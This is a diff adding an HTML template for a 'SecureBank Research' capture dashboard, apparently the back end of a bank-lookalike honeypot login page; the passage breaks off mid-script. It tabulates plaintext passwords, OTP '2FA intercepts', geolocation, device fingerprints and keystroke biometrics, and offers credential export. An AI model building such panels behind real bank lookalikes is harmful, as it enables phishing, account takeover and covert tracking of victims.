@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Capture Dashboard — SecureBank Research</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+</head>
+<body class="dark-bg">
+  <header class="dash-header">
+    <div class="dash-header-inner">
+      <div class="dash-brand">
+        <svg viewBox="0 0 40 40" fill="none" style="width:26px;height:26px;">
+          <rect width="40" height="40" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
+          <path d="M20 8L32 14V16H8V14L20 8Z" fill="#f5c518"/>
+          <rect x="10" y="18" width="4" height="10" fill="#64748b"/>
+          <rect x="18" y="18" width="4" height="10" fill="#64748b"/>
+          <rect x="26" y="18" width="4" height="10" fill="#64748b"/>
+          <rect x="8" y="29" width="24" height="3" fill="#f5c518"/>
+        </svg>
+        <span>SecureBank <span style="color:#f5c518;">Research</span> Dashboard</span>
+      </div>
+      <div class="dash-header-actions">
+        <a href="/dashboard/export/credentials" class="dash-btn-outline">Export Credentials</a>
+        <a href="/dashboard/export/behavior" class="dash-btn-outline" style="color:#60a5fa;border-color:#1e40af;">Export Behavior JSON</a>
+        <form method="POST" action="/dashboard/clear" style="display:inline;" onsubmit="return confirm('Clear selected logs?')">
+          <input type="hidden" name="target" value="all" />
+          <button type="submit" class="dash-btn-danger">Clear All</button>
+        </form>
+        <a href="/dashboard/logout" class="dash-btn-outline">Logout</a>
+        <a href="/login" target="_blank" class="dash-btn-primary">View Honeypot →</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Tab nav -->
+  <div class="tab-nav">
+    <button class="tab-btn active" onclick="showTab('credentials',this)">Credentials &amp; Logins</button>
+    <button class="tab-btn" onclick="showTab('behavior',this)">Behavioral Biometrics</button>
+    <button class="tab-btn" onclick="showTab('mlanalysis',this)">🤖 ML Analysis</button>
+  </div>
+
+  <main class="dash-main">
+
+    <!-- ── CREDENTIALS TAB ── -->
+    <div id="tab-credentials">
+
+      <!-- Stats row -->
+      <div class="stats-row" style="grid-template-columns:repeat(6,1fr);">
+        <div class="stat-card">
+          <div class="stat-label">Total Attempts</div>
+          <div class="stat-value">{{ stats.total }}</div>
+          <div class="stat-sub">All login events</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">✅ Successful</div>
+          <div class="stat-value" style="color:#34d399;">{{ stats.success_logins }}</div>
+          <div class="stat-sub">Correct credentials</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">❌ Failed</div>
+          <div class="stat-value" style="color:#f87171;">{{ stats.failed_logins }}</div>
+          <div class="stat-sub">Wrong password / user</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Registered Users</div>
+          <div class="stat-value" style="color:#60a5fa;">{{ stats.registered_users }}</div>
+          <div class="stat-sub">In users.json DB</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Unique IPs</div>
+          <div class="stat-value">{{ stats.unique_ips }}</div>
+          <div class="stat-sub">Distinct sources</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">OTP Captures</div>
+          <div class="stat-value">{{ logs | selectattr('username', 'equalto', '[OTP-STEP]') | list | length }}</div>
+          <div class="stat-sub">2FA intercepts</div>
+        </div>
+      </div>
+
+      <div class="table-section">
+        <div class="table-header">
+          <h2>Captured Credentials</h2>
+          <div class="table-meta">{{ logs | length }} entries · most recent first</div>
+        </div>
+        {% if logs %}
+        <div class="table-scroll">
+          <table class="capture-table">
+            <thead>
+              <tr>
+                <th>#</th><th>Timestamp (UTC)</th><th>IP Address</th>
+                <th>Username</th><th>Password</th><th>Account Type</th>
+                <th>Result</th><th>User Agent</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for row in logs %}
+              <tr class="{% if row.username == '[OTP-STEP]' %}row-otp{% endif %}">
+                <td class="mono dim">{{ loop.index }}</td>
+                <td class="mono">{{ row.timestamp[:19].replace('T',' ') if row.timestamp else '—' }}</td>
+                <td class="mono chip-ip">{{ row.ip_address or '—' }}</td>
+                <td class="mono cred-user">{{ row.username or '—' }}</td>
+                <td class="mono cred-pass">{{ row.password or '—' }}</td>
+                <td>
+                  <span class="badge-type badge-{{ row.account_type | lower | replace(' ','') if row.account_type else 'unknown' }}">
+                    {{ row.account_type or '—' }}
+                  </span>
+                </td>
+                <td>
+                  {% set r = row.result or '' %}
+                  {% if r == 'success' %}
+                    <span style="background:rgba(34,197,94,0.12);color:#4ade80;border:1px solid rgba(34,197,94,0.3);font-size:0.72rem;font-weight:700;padding:0.18rem 0.55rem;border-radius:4px;">✓ SUCCESS</span>
+                  {% elif r == 'failed' %}
+                    <span style="background:rgba(239,68,68,0.12);color:#f87171;border:1px solid rgba(239,68,68,0.3);font-size:0.72rem;font-weight:700;padding:0.18rem 0.55rem;border-radius:4px;">✗ FAILED</span>
+                  {% elif r == 'registered' %}
+                    <span style="background:rgba(96,165,250,0.12);color:#60a5fa;border:1px solid rgba(96,165,250,0.3);font-size:0.72rem;font-weight:700;padding:0.18rem 0.55rem;border-radius:4px;">+ REGISTER</span>
+                  {% elif r == 'intercepted' %}
+                    <span style="background:rgba(245,197,24,0.12);color:#fbbf24;border:1px solid rgba(245,197,24,0.3);font-size:0.72rem;font-weight:700;padding:0.18rem 0.55rem;border-radius:4px;">⚡ OTP</span>
+                  {% else %}
+                    <span class="dim">—</span>
+                  {% endif %}
+                </td>
+                <td class="ua-cell" title="{{ row.user_agent }}">{{ (row.user_agent or '—')[:55] }}{% if (row.user_agent or '') | length > 55 %}…{% endif %}</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+        {% else %}
+        <div class="empty-state">
+          <p>No credential captures yet. Visit <a href="/login" target="_blank" style="color:#f5c518;">/login</a> to generate entries.</p>
+        </div>
+        {% endif %}
+      </div>
+    </div>
+
+    <!-- ── BEHAVIORAL TAB ── -->
+    <div id="tab-behavior" style="display:none;">
+
+      <div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-label">Behavior Sessions</div>
+          <div class="stat-value">{{ stats.behavior_sessions }}</div>
+          <div class="stat-sub">Tracking snapshots received</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Total Mouse Points</div>
+          <div class="stat-value">{{ behavior | sum(attribute='mouse_sample_count') if behavior else 0 }}</div>
+          <div class="stat-sub">Sampled at 50 ms intervals</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Total Keystrokes</div>
+          <div class="stat-value">{{ behavior | sum(attribute='keystroke_count') if behavior else 0 }}</div>
+          <div class="stat-sub">With dwell + flight timing</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Geolocation Grants</div>
+          <div class="stat-value">{{ behavior | selectattr('geolocation') | selectattr('geolocation.latitude', 'defined') | list | length if behavior else 0 }}</div>
+          <div class="stat-sub">Browser GPS permitted</div>
+        </div>
+      </div>
+
+      {% if behavior %}
+      {% for session in behavior %}
+      <div class="behavior-card">
+        <div class="behavior-card-header" onclick="toggleBehavior(this)">
+          <div class="behavior-meta">
+            <span class="behavior-badge {% if session.is_final %}badge-final{% else %}badge-interim{% endif %}">
+              {{ 'FINAL' if session.is_final else 'SNAPSHOT' }}
+            </span>
+            <span class="mono chip-ip">{{ session.ip_address or '—' }}</span>
+            <span class="dim-text">{{ session.server_timestamp[:19].replace('T',' ') if session.server_timestamp else '—' }}</span>
+            <span class="dim-text">Page: <strong style="color:#f1f5f9;">{{ session.page or '—' }}</strong></span>
+            <span class="dim-text">Duration: <strong style="color:#f5c518;">{{ ((session.session_duration_ms or 0) / 1000) | round(1) }}s</strong></span>
+            <span class="dim-text">Session: <span class="mono" style="color:#94a3b8;font-size:0.75rem;">{{ (session.session_id or '')[:12] }}…</span></span>
+          </div>
+          <div style="display:flex;align-items:center;gap:0.75rem;">
+            {% if session.session_id %}
+            <button
+              onclick="event.stopPropagation(); kickSession(this, '{{ session.session_id }}')"
+              data-sid="{{ session.session_id }}"
+              style="background:rgba(239,68,68,0.12);border:1px solid rgba(239,68,68,0.35);color:#f87171;font-size:0.72rem;font-weight:700;padding:0.25rem 0.65rem;border-radius:5px;cursor:pointer;letter-spacing:0.03em;transition:background 0.15s;"
+              onmouseover="this.style.background='rgba(239,68,68,0.25)'"
+              onmouseout="this.style.background='rgba(239,68,68,0.12)'"
+            >🚫 Kick</button>
+            {% endif %}
+            <svg class="chevron" viewBox="0 0 12 8" fill="none"><path d="M1 1l5 5 5-5" stroke="#64748b" stroke-width="1.5" stroke-linecap="round"/></svg>
+          </div>
+        </div>
+
+        <div class="behavior-body" style="display:none;">
+          <div class="behavior-grid">
+
+            <!-- Mouse -->
+            <div class="bsection">
+              <div class="bsection-title">🖱️ Mouse Movement</div>
+              <div class="brow"><span>Samples</span><span class="mono val">{{ session.mouse_sample_count or 0 }}</span></div>
+              <div class="brow"><span>Speed mean</span><span class="mono val">{{ (session.mouse_speed_mean or 0) | round(1) }} px/s</span></div>
+              <div class="brow"><span>Speed std</span><span class="mono val">{{ (session.mouse_speed_std or 0) | round(1) }}</span></div>
+              <div class="brow"><span>Speed max</span><span class="mono val">{{ (session.mouse_speed_max or 0) | round(1) }} px/s</span></div>
+              <div class="brow"><span>Accel mean</span><span class="mono val">{{ (session.mouse_acceleration_mean or 0) | round(1) }}</span></div>
+            </div>
+
+            <!-- Clicks -->
+            <div class="bsection">
+              <div class="bsection-title">👆 Clicks</div>
+              <div class="brow"><span>Total clicks</span><span class="mono val">{{ session.click_count or 0 }}</span></div>
+              {% if session.clicks %}
+              {% for c in session.clicks[:5] %}
+              <div class="brow small"><span>{{ c.target }}</span><span class="mono val dim">({{ c.x }}, {{ c.y }})</span></div>
+              {% endfor %}
+              {% if session.clicks | length > 5 %}
+              <div class="brow small dim-text">+ {{ (session.clicks | length) - 5 }} more…</div>
+              {% endif %}
+              {% endif %}
+            </div>
+
+            <!-- Keyboard -->
+            <div class="bsection">
+              <div class="bsection-title">⌨️ Keystroke Dynamics</div>
+              <div class="brow"><span>Keystrokes</span><span class="mono val">{{ session.keystroke_count or 0 }}</span></div>
+              <div class="brow"><span>Chars typed</span><span class="mono val">{{ session.char_count or 0 }}</span></div>
+              <div class="brow"><span>Typing speed</span><span class="mono val">{{ (session.typing_speed_cps or 0) | round(2) }} c/s</span></div>
+              <div class="brow"><span>Dwell mean</span><span class="mono val">{{ (session.key_dwell_mean_ms or 0) | round(1) }} ms</span></div>
+              <div class="brow"><span>Dwell std</span><span class="mono val">{{ (session.key_dwell_std_ms or 0) | round(1) }} ms</span></div>
+              <div class="brow"><span>Flight mean</span><span class="mono val">{{ (session.key_flight_mean_ms or 0) | round(1) }} ms</span></div>
+              <div class="brow"><span>Flight std</span><span class="mono val">{{ (session.key_flight_std_ms or 0) | round(1) }} ms</span></div>
+            </div>
+
+            <!-- Scroll -->
+            <div class="bsection">
+              <div class="bsection-title">📜 Scroll Behavior</div>
+              <div class="brow"><span>Scroll events</span><span class="mono val">{{ session.scroll_event_count or 0 }}</span></div>
+              <div class="brow"><span>Speed mean</span><span class="mono val">{{ (session.scroll_speed_mean or 0) | round(1) }} px/s</span></div>
+              <div class="brow"><span>Speed max</span><span class="mono val">{{ (session.scroll_speed_max or 0) | round(1) }} px/s</span></div>
+              <div class="brow"><span>Max depth</span><span class="mono val">{{ session.max_scroll_depth_px or 0 }} px</span></div>
+            </div>
+
+            <!-- Idle & session -->
+            <div class="bsection">
+              <div class="bsection-title">⏱️ Session & Idle</div>
+              <div class="brow"><span>Duration</span><span class="mono val">{{ ((session.session_duration_ms or 0)/1000)|round(1) }}s</span></div>
+              <div class="brow"><span>Idle time</span><span class="mono val">{{ ((session.total_idle_ms or 0)/1000)|round(1) }}s</span></div>
+              <div class="brow"><span>Idle ratio</span><span class="mono val">{{ ((session.idle_ratio or 0)*100)|round(1) }}%</span></div>
+            </div>
+
+            <!-- Geolocation -->
+            <div class="bsection">
+              <div class="bsection-title">📍 Geolocation</div>
+              {% if session.geolocation and session.geolocation.latitude is defined %}
+              <div class="brow"><span>Latitude</span><span class="mono val">{{ session.geolocation.latitude | round(4) }}</span></div>
+              <div class="brow"><span>Longitude</span><span class="mono val">{{ session.geolocation.longitude | round(4) }}</span></div>
+              <div class="brow"><span>Accuracy</span><span class="mono val">{{ (session.geolocation.accuracy or 0) | round(0) }}m</span></div>
+              {% elif session.geolocation and session.geolocation.error %}
+              <div class="brow dim-text small">Denied: {{ session.geolocation.error }}</div>
+              {% else %}
+              <div class="brow dim-text small">Not yet captured</div>
+              {% endif %}
+            </div>
+
+            <!-- Device fingerprint -->
+            {% if session.fingerprint %}
+            <div class="bsection" style="grid-column: span 2;">
+              <div class="bsection-title">🖥️ Device Fingerprint</div>
+              <div class="fingerprint-grid">
+                <div class="brow"><span>Screen</span><span class="mono val">{{ session.fingerprint.screen_width }}×{{ session.fingerprint.screen_height }}</span></div>
+                <div class="brow"><span>Viewport</span><span class="mono val">{{ session.fingerprint.viewport_width }}×{{ session.fingerprint.viewport_height }}</span></div>
+                <div class="brow"><span>Pixel ratio</span><span class="mono val">{{ session.fingerprint.pixel_ratio }}</span></div>
+                <div class="brow"><span>Timezone</span><span class="mono val">{{ session.fingerprint.timezone or '—' }}</span></div>
+                <div class="brow"><span>Language</span><span class="mono val">{{ session.fingerprint.language or '—' }}</span></div>
+                <div class="brow"><span>Platform</span><span class="mono val">{{ session.fingerprint.platform or '—' }}</span></div>
+                <div class="brow"><span>CPU cores</span><span class="mono val">{{ session.fingerprint.hardware_concurrency or '—' }}</span></div>
+                <div class="brow"><span>Device RAM</span><span class="mono val">{{ session.fingerprint.device_memory or '—' }} GB</span></div>
+                <div class="brow"><span>Touch points</span><span class="mono val">{{ session.fingerprint.touch_points or 0 }}</span></div>
+                <div class="brow"><span>Plugins</span><span class="mono val">{{ session.fingerprint.plugins_count or 0 }}</span></div>
+                <div class="brow"><span>Do Not Track</span><span class="mono val">{{ session.fingerprint.do_not_track or '—' }}</span></div>
+                <div class="brow" style="grid-column:span 2;"><span>WebGL Renderer</span><span class="mono val" style="font-size:0.72rem;">{{ (session.fingerprint.webgl_renderer or '—')[:80] }}</span></div>
+              </div>
+            </div>
+            {% endif %}
+
+            <!-- Dwell top elements -->
+            {% if session.dwell_by_element %}
+            <div class="bsection" style="grid-column: span 2;">
+              <div class="bsection-title">🎯 Cursor Dwell — Top Elements</div>
+              <div class="dwell-bars">
+                {% set max_dwell = session.dwell_by_element[0].dwell_ms if session.dwell_by_element else 1 %}
+                {% for item in session.dwell_by_element[:12] %}
+                <div class="dwell-row">
+                  <span class="dwell-label mono">{{ item.element }}</span>
+                  <div class="dwell-bar-wrap">
+                    <div class="dwell-bar" data-width="{{ ((item.dwell_ms / max_dwell) * 100)|int }}"></div>
+                  </div>
+                  <span class="dwell-val mono">{{ item.dwell_ms }}ms</span>
+                </div>
+                {% endfor %}
+              </div>
+            </div>
+            {% endif %}
+
+            <!-- Heatmap -->
+            {% if session.heatmap %}
+            <div class="bsection" style="grid-column: span 4;">
+              <div class="bsection-title">🔥 Cursor Heatmap ({{ session.heatmap_grid_cols }}×{{ session.heatmap_grid_rows }} grid)</div>
+              <div class="heatmap-grid" id="hm-{{ loop.index }}"
+                data-hm='{{ session.heatmap | tojson }}'
+                data-cols="{{ session.heatmap_grid_cols }}"
+                data-rows="{{ session.heatmap_grid_rows }}">
+              </div>
+            </div>
+            {% endif %}
+
+          </div>
+        </div>
+      </div>
+      {% endfor %}
+
+      {% else %}
+      <div class="table-section">
+        <div class="empty-state">
+          <p>No behavioral data yet. Visit <a href="/home" target="_blank" style="color:#f5c518;">/home</a> after logging in to generate entries.</p>
+        </div>
+      </div>
+      {% endif %}
+    </div>
+
+    <!-- ── ML ANALYSIS TAB ── -->
+    <div id="tab-mlanalysis" style="display:none;">
+
+      <div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-label">🤖 ML Status</div>
+          <div class="stat-value" style="color:#4ade80;" id="ml-status-val">Loading…</div>
+          <div class="stat-sub">Model load status</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Sessions Analyzed</div>
+          <div class="stat-value" id="ml-analyzed-count">—</div>
+          <div class="stat-sub">Real-time scored</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">⚠ High Risk</div>
+          <div class="stat-value" style="color:#f87171;" id="ml-high-risk">—</div>
+          <div class="stat-sub">Score ≥ 50</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">🚫 Auto-Kicked</div>
+          <div class="stat-value" style="color:#ef4444;" id="ml-kicked-count">—</div>
+          <div class="stat-sub">Score ≥ 75 (Critical)</div>
+        </div>
+      </div>
+
+      <div class="table-section">
+        <div class="table-header">
+          <h2>Live ML Scoring — Per Session</h2>
+          <div class="table-meta">Scores computed in real-time on each behavior snapshot</div>
+        </div>
+        <div id="ml-results-container" class="ml-results-loading">
+          <div style="text-align:center;padding:2rem;color:#64748b;">
+            <svg viewBox="0 0 24 24" fill="none" style="width:32px;height:32px;margin-bottom:0.5rem;animation:spin 2s linear infinite;">
+              <circle cx="12" cy="12" r="10" stroke="rgba(100,116,139,0.3)" stroke-width="2"/>
+              <path d="M12 2a10 10 0 0110 10" stroke="#f5c518" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <div>Fetching ML analysis…</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <style>
+    .tab-nav { background: #0f172a; border-bottom: 1px solid #1e293b; display: flex; padding: 0 2rem; gap: 0; }
+    .tab-btn { background: none; border: none; border-bottom: 3px solid transparent; padding: 0.85rem 1.5rem; font-size: 0.88rem; font-weight: 600; color: #64748b; cursor: pointer; font-family: inherit; transition: all .15s; }
+    .tab-btn:hover { color: #94a3b8; }
+    .tab-btn.active { color: #f5c518; border-bottom-color: #f5c518; }
+
+    .behavior-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; overflow: hidden; margin-bottom: 1rem; }
+    .behavior-card-header { display: flex; align-items: center; justify-content: space-between; padding: 0.9rem 1.25rem; cursor: pointer; transition: background .15s; }
+    .behavior-card-header:hover { background: rgba(255,255,255,0.03); }
+    .behavior-meta { display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .behavior-badge { font-size: 0.68rem; font-weight: 700; padding: 0.2rem 0.55rem; border-radius: 4px; letter-spacing: 0.05em; }
+    .badge-final { background: rgba(245,197,24,0.15); color: #f5c518; border: 1px solid rgba(245,197,24,0.3); }
+    .badge-interim { background: rgba(100,116,139,0.2); color: #94a3b8; border: 1px solid #334155; }
+    .dim-text { font-size: 0.8rem; color: #64748b; }
+    .chevron { width: 12px; height: 8px; transition: transform .2s; flex-shrink: 0; }
+    .chevron.open { transform: rotate(180deg); }
+    .behavior-body { padding: 1.25rem; border-top: 1px solid #334155; }
+    .behavior-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; }
+    .bsection { background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; padding: 0.9rem 1rem; }
+    .bsection-title { font-size: 0.78rem; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 0.6rem; border-bottom: 1px solid #1e293b; padding-bottom: 0.4rem; }
+    .brow { display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; padding: 0.2rem 0; color: #64748b; }
+    .brow.small { font-size: 0.73rem; }
+    .val { color: #e2e8f0; font-size: 0.8rem; }
+    .fingerprint-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0; }
+    .dwell-bars { display: flex; flex-direction: column; gap: 0.4rem; }
+    .dwell-row { display: grid; grid-template-columns: 180px 1fr 70px; align-items: center; gap: 0.75rem; font-size: 0.78rem; }
+    .dwell-label { color: #60a5fa; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.73rem; }
+    .dwell-bar-wrap { background: #1e293b; border-radius: 4px; height: 6px; }
+    .dwell-bar { background: linear-gradient(90deg, #1d4ed8, #60a5fa); border-radius: 4px; height: 6px; min-width: 2px; }
+    .dwell-val { color: #94a3b8; text-align: right; }
+    .heatmap-grid { display: flex; flex-direction: column; gap: 1px; margin-top: 0.5rem; }
+    .heatmap-row { display: flex; gap: 1px; }
+    .heatmap-cell { flex: 1; height: 12px; border-radius: 1px; }
+
+    @media (max-width: 1100px) {
+      .behavior-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    /* ML Analysis tab styles */
+    .ml-session-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 1rem 1.25rem; margin-bottom: 0.75rem; display: grid; grid-template-columns: 80px 1fr 120px 100px 100px 90px; align-items: center; gap: 1rem; transition: all 0.15s; }
+    .ml-session-card:hover { border-color: #475569; background: #1e293b; }
+    .ml-session-card.risk-critical { border-left: 3px solid #ef4444; }
+    .ml-session-card.risk-high { border-left: 3px solid #f97316; }
+    .ml-session-card.risk-medium { border-left: 3px solid #eab308; }
+    .ml-session-card.risk-low { border-left: 3px solid #22c55e; }
+    .ml-score-circle { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; font-weight: 800; font-family: 'JetBrains Mono', monospace; }
+    .ml-score-circle.low { background: rgba(34,197,94,0.12); color: #4ade80; border: 2px solid rgba(34,197,94,0.3); }
+    .ml-score-circle.medium { background: rgba(234,179,8,0.12); color: #facc15; border: 2px solid rgba(234,179,8,0.3); }
+    .ml-score-circle.high { background: rgba(249,115,22,0.12); color: #fb923c; border: 2px solid rgba(249,115,22,0.3); }
+    .ml-score-circle.critical { background: rgba(239,68,68,0.12); color: #f87171; border: 2px solid rgba(239,68,68,0.3); animation: critPulse 1.5s infinite; }
+    @keyframes critPulse { 0%,100% { box-shadow: 0 0 0 0 rgba(239,68,68,0.3); } 50% { box-shadow: 0 0 12px 4px rgba(239,68,68,0.15); } }
+    .ml-session-info { display: flex; flex-direction: column; gap: 2px; }
+    .ml-session-sid { font-size: 0.78rem; font-family: 'JetBrains Mono', monospace; color: #94a3b8; }
+    .ml-session-page { font-size: 0.75rem; color: #64748b; }
+    .ml-session-time { font-size: 0.72rem; color: #475569; }
+    .ml-chip { font-size: 0.68rem; font-weight: 700; padding: 0.2rem 0.5rem; border-radius: 4px; display: inline-block; text-align: center; }
+    .ml-chip.human { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }
+    .ml-chip.bot { background: rgba(239,68,68,0.12); color: #f87171; border: 1px solid rgba(239,68,68,0.3); }
+    .ml-chip.normal { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }
+    .ml-chip.anomaly { background: rgba(249,115,22,0.12); color: #fb923c; border: 1px solid rgba(249,115,22,0.3); }
+    .ml-chip.kicked { background: rgba(239,68,68,0.12); color: #f87171; border: 1px solid rgba(239,68,68,0.3); font-weight: 800; }
+    .ml-chip.active { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+
+  <script>
+    // Auto-refresh every 20 seconds
+    setTimeout(() => location.reload(), 20000);
+
+    function showTab(name, btn) {
+      document.getElementById('tab-credentials').style.display = name === 'credentials' ? '' : 'none';
+      document.getElementById('tab-behavior').style.display = name === 'behavior' ? '' : 'none';
+      document.getElementById('tab-mlanalysis').style.display = name === 'mlanalysis' ? '' : 'none';
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      if (name === 'mlanalysis') loadMLAnalysis();
+    }
+
+    // ── ML Analysis loader ─────────────────────────────────────────
+    let mlLoaded = false;
+    function loadMLAnalysis() {
+      if (mlLoaded) return;
+      mlLoaded = true;
+      // Fetch ML status
+      fetch('/api/ml/status').then(r => r.json()).then(data => {
+        document.getElementById('ml-status-val').textContent = data.models_loaded ? '✓ Models Loaded' : '✗ Not Trained';
+        document.getElementById('ml-status-val').style.color = data.models_loaded ? '#4ade80' : '#f87171';
+      }).catch(() => {
+        document.getElementById('ml-status-val').textContent = '✗ Unavailable';
+        document.getElementById('ml-status-val').style.color = '#f87171';
+      });
+
+      // Fetch behavior data and score it
+      fetch('/dashboard/export/behavior').then(r => r.json()).then(sessions => {
+        const container = document.getElementById('ml-results-container');
+        if (!sessions || sessions.length === 0) {
+          container.innerHTML = '<div style="text-align:center;padding:2rem;color:#64748b;">No behavior sessions to analyze.</div>';
+          return;
+        }
+
+        // Score each session via batch API
+        fetch('/api/ml/analyze/batch', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(sessions),
+        }).then(r => r.json()).then(mlData => {
+          if (mlData.error) {
+            container.innerHTML = `<div style="text-align:center;padding:2rem;color:#f87171;">ML Error: ${mlData.error}</div>`;
+            return;
+          }
+
+          const results = mlData.results || [];
+          const kicked = new Set();
+          fetch('/api/session-check').catch(() => {});
+
+          // Stats
+          document.getElementById('ml-analyzed-count').textContent = results.length;
+          document.getElementById('ml-high-risk').textContent = results.filter(r => r.risk_score >= 50).length;
+          document.getElementById('ml-kicked-count').textContent = results.filter(r => r.risk_score >= 75).length;
+
+          // Render cards
+          let html = '<div style="display:flex;align-items:center;gap:1rem;padding:0.5rem 0 0.75rem;color:#64748b;font-size:0.72rem;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;">' +
+            '<div style="width:80px;">Score</div><div style="flex:1;">Session</div><div style="width:120px;">Risk Level</div><div style="width:100px;">Bot</div><div style="width:100px;">Anomaly</div><div style="width:90px;">Status</div>' +
+          '</div>';
+
+          for (let i = 0; i < results.length; i++) {
+            const r = results[i];
+            const s = sessions[i] || {};
+            const level = r.risk_level || 'low';
+            const sid = (s.session_id || '').slice(0, 12);
+            const page = s.page || '—';
+            const ts = (s.server_timestamp || '').slice(0, 19).replace('T', ' ');
+            const isKicked = r.risk_score >= 75;
+
+            html += `<div class="ml-session-card risk-${level}">`;
+            html += `  <div class="ml-score-circle ${level}">${r.risk_score}</div>`;
+            html += `  <div class="ml-session-info">`;
+            html += `    <div class="ml-session-sid">${sid}…</div>`;
+            html += `    <div class="ml-session-page">Page: <strong style="color:#e2e8f0;">${page}</strong></div>`;
+            html += `    <div class="ml-session-time">${ts}</div>`;
+            html += `  </div>`;
+            html += `  <div><span class="ml-chip" style="background:rgba(${level==='critical'?'239,68,68':level==='high'?'249,115,22':level==='medium'?'234,179,8':'34,197,94'},0.12);color:${level==='critical'?'#f87171':level==='high'?'#fb923c':level==='medium'?'#facc15':'#4ade80'};border:1px solid rgba(${level==='critical'?'239,68,68':level==='high'?'249,115,22':level==='medium'?'234,179,8':'34,197,94'},0.3);">${level.toUpperCase()}</span></div>`;
+            html += `  <div><span class="ml-chip ${r.is_bot ? 'bot' : 'human'}">${r.is_bot ? '⚠ Bot' : '✓ Human'}</span></div>`;
+            html += `  <div><span class="ml-chip ${r.is_anomaly ? 'anomaly' : 'normal'}">${r.is_anomaly ? '⚠ Anomaly' : '✓ Normal'}</span></div>`;
+            html += `  <div><span class="ml-chip ${isKicked ? 'kicked' : 'active'}">${isKicked ? '🚫 Kicked' : '● Active'}</span></div>`;
+            html += `</div>`;
+          }
+          container.innerHTML = html;
+        }).catch(err => {
+          container.innerHTML = `<div style="text-align:center;padding:2rem;color:#f87171;">ML scoring failed: ${err.message}</div>`;
+        });
+      }).catch(err => {
+        document.getElementById('ml-results-container').innerHTML = `<div style="text-align:center;padding:2rem;color:#f87171;">Failed to load behavior data: ${err.message}</div>`;
+      });
+    }
+
+    function toggleBehavior(header) {
+      const body = header.nextElementSibling;
+      const chevron = header.querySelector('.chevron path');
+      const open = body.style.display !== 'none';
+      body.style.display = open ? 'none' : '';
+    }
+
+    function kickSession(btn, sid) {
+      if (!confirm('Kick this session? The user will be immediately redirected to the login page.')) return;
+      btn.disabled = true;
+      btn.textContent = '⏳ Kicking…';
+      fetch('/api/kick', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session_id: sid }),
+      }).then(r => r.json()).then(data => {
+        if (data.status === 'kicked') {
+          btn.textContent = '✓ Kicked';
+          btn.style.background = 'rgba(34,197,94,0.12)';
+          btn.style.color = '#4ade80';
+          btn.style.borderColor = 'rgba(34,197,94,0.3)';
+          btn.closest('.behavior-card').style.opacity = '0.55';
+        } else {
+          btn.textContent = '🚫 Kick';
+          btn.disabled = false;
+          alert('Error: ' + (data.detail || 'unknown'));
+        }
+      }).catch(() => { btn.textContent = '🚫 Kick'; btn.disabled = false; });
+    }
+
+    // Render heatmaps
+    document.querySelectorAll('.heatmap-grid').forEach(el => {
+      const data = JSON.parse(el.dataset.hm || '[]');
+      const cols = parseInt(el.dataset.cols);
+      const rows = parseInt(el.dataset.rows);
+      if (!data.length) { el.innerHTML = '<div style="color:#475569;font-size:0.78rem;">No heatmap data</div>'; return; }
+
+      // Build 2D array
+      const grid = Array.from({ length: rows }, () => new Array(cols).fill(0));
+      let maxVal = 1;
+      data.forEach(({ col, row, count }) => {
+        if (row < rows && col < cols) {
+          grid[row][col] = count;
+          if (count > maxVal) maxVal = count;
+        }
+      });
+
+      el.innerHTML = grid.map(rowArr => {
+        const cells = rowArr.map(v => {
+          if (v === 0) return '<div class="heatmap-cell" style="background:#0f172a;"></div>';
+          const intensity = v / maxVal;
+          const r = Math.round(20 + intensity * 220);
+          const g = Math.round(30 - intensity * 30);
+          const b = Math.round(100 - intensity * 100);
+          const a = 0.3 + intensity * 0.7;
